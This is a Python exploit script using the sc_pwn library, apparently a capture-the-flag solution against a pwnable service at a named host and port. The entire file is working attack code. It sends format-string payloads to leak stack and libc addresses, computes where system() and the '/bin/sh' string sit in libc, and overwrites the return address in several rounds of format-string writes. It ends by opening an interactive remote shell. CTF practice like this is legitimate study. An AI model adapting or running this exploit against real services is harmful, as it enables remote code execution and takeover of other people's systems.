#!/usr/bin/env python
from sc_pwn import *
from time import sleep

rhp     = ('pwnable.elliptic-shiho.xyz',20065)
#rhp     = ('192.168.75.129',8080)

offset_libc_main    = 0x00019970
offset_libc_exit    = 0x00032ec0
offset_libc_system  = 0x0003fcd0
offset_libc_str_sh  = 0x0015da84

#==========
def attack(nc):
    sleep(3)
    nc.read_until('name?\n')
    nc.sendln('0x%10$08x 0x%23$08x')
    nc.read_until('Hello, ')
    
    addrs = nc.read_until('\n').split(' ')
    addr_stack_ret  = int(addrs[0],16) - 0x2c
    addr_libc_main  = int(addrs[1],16) - 0xf3

    addr_base_libc      = addr_libc_main - offset_libc_main
    addr_libc_system    = addr_base_libc + offset_libc_system
    addr_libc_exit      = addr_base_libc + offset_libc_exit
    addr_libc_str_sh    = addr_base_libc + offset_libc_str_sh

    info('addr_stack_ret    = 0x%08x'%addr_stack_ret)
    info('addr_libc_system  = 0x%08x'%addr_libc_system)

    sleep(3)
    nc.read_until('name?\n')
    fsb = FSB(size=2)
    fsb.write(14,addr_stack_ret&0xffff)
    nc.sendln(fsb.get())

    proc('rewriting 0x%08x -> [0x%08x]' % (addr_libc_system,addr_stack_ret))
    sleep(3)
    nc.read_until('name?\n')
    fsb = FSB(size=2)
    fsb.write(65,addr_libc_system&0xffff)
    fsb.write(14,(addr_stack_ret+0x2)&0xffff)
    nc.sendln(fsb.get())

    sleep(3)
    nc.read_until('name?\n')
    fsb = FSB(size=2)
    fsb.write(65,addr_libc_system>>0x10)
    fsb.write(14,(addr_stack_ret+0x8)&0xffff)
    nc.sendln(fsb.get())

    proc('rewriting 0x%08x -> [0x%08x]' % (addr_libc_str_sh,addr_stack_ret+0x8))
    sleep(3)
    nc.read_until('name?\n')
    fsb = FSB(size=2)
    fsb.write(65,addr_libc_str_sh&0xffff)
    fsb.write(14,(addr_stack_ret+0xa)&0xffff)
    nc.sendln(fsb.get())

    sleep(3)
    nc.read_until('name?\n')
    fsb = FSB(size=2)
    fsb.write(65,addr_libc_str_sh>>0x10)
    nc.sendln(fsb.get())

    sleep(3)
    nc.read_until('name?\n')
    nc.sendln('')
    nc.read_all()

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
